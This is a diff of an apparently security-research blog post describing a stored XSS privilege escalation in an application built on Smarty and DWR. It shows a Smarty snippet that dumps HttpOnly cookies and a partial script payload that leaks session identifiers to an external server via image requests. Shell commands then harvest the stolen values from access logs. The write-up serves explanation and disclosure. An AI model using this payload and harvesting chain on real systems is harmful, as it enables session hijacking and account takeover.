@@ -55,7 +55,7 @@ Problem. XSS would not be able to steal the JSESSIONID because its corresponding
 
 **Item #2 Solution:**
 
-Despite the HTTP Cookie flags being marked appropriately (e.g. HttpOnly), this JSESSIONID can be accessed with Smarty by a user with our “medium-ish” privileges since these privileges allowed for the creation of custom HTML. So using Smarty the JSESSIONID could be obtained by adding the following snippet to a custom HTML page: {$smarty.cookies|@debug_print_var} . This would yield the following information:
+Despite the HTTP Cookie flags being marked appropriately (e.g. HttpOnly), this JSESSIONID can be accessed with Smarty by a user with our “medium-ish” privileges since these privileges allowed for the creation of custom HTML. So using Smarty the JSESSIONID could be obtained by adding the following snippet to a custom HTML page: ``{$smarty.cookies|@debug_print_var}``. This would yield the following information:
 
 ![Smarty_cookies_debug_print.png]({{site.baseurl}}/assets/media/posts/redacted/Smarty_cookies_debug_print.png)
 
@@ -68,13 +68,13 @@ Problem. The scriptSessionId could not be obtained via XSS as it was a value sen
 **Item #3 Solution:**
 
 The scriptSessionId is the DWRSESSIONID concatenated with a "/" and a "_pageId" variable the end user does not know about (DWRSESSIONID + "/" + dwr.engine._pageId). The value that is calculated would be incredibly difficult to guess based on its complexity. The Javascript source showed how this value is calculated in "/dwrS/engine.js" with the following snippet:
-```dwr.engine._pageId = dwr.engine.util.tokenify(new Date().getTime()) + "-" + dwr.engine.util.tokenify(Math.random() * 1E16);```
+``dwr.engine._pageId = dwr.engine.util.tokenify(new Date().getTime()) + "-" + dwr.engine.util.tokenify(Math.random() * 1E16);``
 
 In order to obtain the scriptSessionId, the application could be used against itself. So the Javascript used to calculate the value must be imported into the final payload ``<script src='/dwrS/engine.js'></script>.`` Next, an XMLHttpRequest (XHR) object must be created to make a secondary request to the server at "/redacted.action". This was done to load the content of this page without having to do a full page refresh. This action will allow access to both the dwr.engine._dwrSessionId + "/" + dwr.engine._pageId variables to be obtained.
 
 With the solution to obtaining all three of the previously mentioned items, the following payload was used to leak each value to an external server using ``new Image().src=`` Javascript references. 
 
-``
+```
 var a = document.getElementById('content-marker');
 var b = a.innerHTML;
 
@@ -109,7 +109,7 @@ var b = a.innerHTML;
    load(url)
 </script>
 {/literal}
-``
+```
 
 So to sum up the vulnerability, using a combination of features from the Smarty template engine and satisfying each requirement from DWR requests via appropriate imports and XHR requests a “medium-ish” privileged user could escalate their privileges to Admin. And problems solved! The final attack is your standard Stored XSS and easy once compared with the creation of the payload:
 
@@ -120,7 +120,9 @@ So to sum up the vulnerability, using a combination of features from the Smarty 
 
 3.	The ”medium-ish” privileged user can then harvest the goods from their logs. Perhaps similar to what is shown below: On the external Apache web server something along the lines of the following could be done to harvest the necessary items:
 ``alias urldecode='python -c "import sys, urllib as ul; print ul.unquote_plus(sys.argv[1])"'``
-``for x in `cut -d ' ' -f7 access.log | cut -d\? -f2`; do urldecode $x;done > these && sed 's/"//g' these | sed 's/ => //g' > sessionvars` && cat sessionvars``
+
+``for x in `cut -d ' ' -f7 access.log | cut -d\? -f2`; do urldecode $x;done > these
+&& sed 's/"//g' these | sed 's/ => //g' > sessionvars`; done;``
 
 4.	Take the output from the console and insert the values in their appropriate positions in the “medium-ish” privileges malicious HTTP requests.
 ![sessionvars.png]({{site.baseurl}}/assets/media/posts/redacted/sessionvars.png)
